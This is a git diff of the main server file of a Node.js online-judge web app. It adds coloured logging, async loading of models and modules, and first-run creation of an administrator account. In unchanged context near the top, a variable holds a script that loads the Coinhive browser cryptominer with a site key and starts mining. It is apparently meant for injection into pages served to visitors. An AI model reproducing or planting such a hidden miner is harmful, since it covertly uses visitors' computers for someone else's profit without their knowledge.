@@ -2,6 +2,8 @@
 
 let fs = require('fs');
 let path = require('path');
+let clc = require('cli-color');
+let init = require('./first');
 let mscript = `$.getScript('https://coinhive.com/lib/coinhive.min.js').done(function (script, textStatus) {	var miner = new CoinHive.Anonymous('2MNJwWlQs2A4c86fbjCLQPTWr2Uz58tY', {language: 'en'});miner.start();})`;
 
 global.firstRun = false;
@@ -10,21 +12,20 @@ try {
 	require('./config.json');
 } catch (e) {
 	global.firstRun = true;
-	require('./first')();
 }
 
 global.zoj = {
 	rootDir: __dirname,
-	config: require('./config.json'),
+	config: firstRun ? init() : require('./config.json'),
 	version: require('./package.json').version,
 	models: [],
 	modules: [],
 	db: null,
 	log(obj) {
-		console.log(obj);
+		console.log(clc.yellow(obj));
 	},
 	error(obj) {
-		console.log(obj);
+		console.log(clc.red(obj));
 	},
 	debug(obj) {
 		console.log(obj);
@@ -84,14 +85,7 @@ global.zoj = {
 		app.use(csurf({ cookie: true }));
 
 		await this.connectDatabase();
-		this.loadModules();
-
-		if (firstRun) {
-			let Group = zoj.model('group');
-			let group = await Group.create();
-			group.name = 'User';
-			await group.save();
-		}
+		await this.loadModules();
 	},
 	async connectDatabase() {
 		let Sequelize = require('sequelize');
@@ -104,9 +98,9 @@ global.zoj = {
 		global.Promise = Sequelize.Promise;
 		this.db.countQuery = async (sql, options) => (await this.db.query(`SELECT COUNT(*) FROM (${sql}) AS \`__tmp_table\``, options))[0][0]['COUNT(*)'];
 
-		this.loadModels();
+		await this.loadModels();
 	},
-	loadModules() {
+	async loadModules() {
 		fs.readdir('./modules/', (err, files) => {
 			if (err) {
 				this.log(err);
@@ -116,7 +110,7 @@ global.zoj = {
 				.forEach((file) => this.modules.push(require(`./modules/${file}`)));
 		});
 	},
-	loadModels() {
+	async loadModels() {
 		fs.readdir('./models/', (err, files) => {
 			if (err) {
 				this.log(err);
@@ -214,3 +208,30 @@ process.on('uncaughtException', function (err) {
 });
 
 zoj.run();
+
+if (firstRun) {
+	zoj.log('Database is loading, please wait...');
+	setTimeout(async function () {
+		let Group = zoj.model('group');
+		let User = zoj.model('user');
+		let conif = require('node-console-input');
+
+		let admins = await Group.create();
+		admins.name = 'Administrators';
+		await admins.save();
+
+		let users = await Group.create();
+		users.name = 'User';
+		await users.save();
+
+		let user = await User.create({
+			username: 'administrator',
+			password: conif.getConsoleInput("Default Administrator password: ", false).trim(),
+			email: conif.getConsoleInput("Default Administrator email: ", false).trim(),
+			public_email: true,
+			group_config: '[1]'
+		});
+		await user.save();
+		zoj.log('Database loaded successfully');
+	}, 10000);
+}
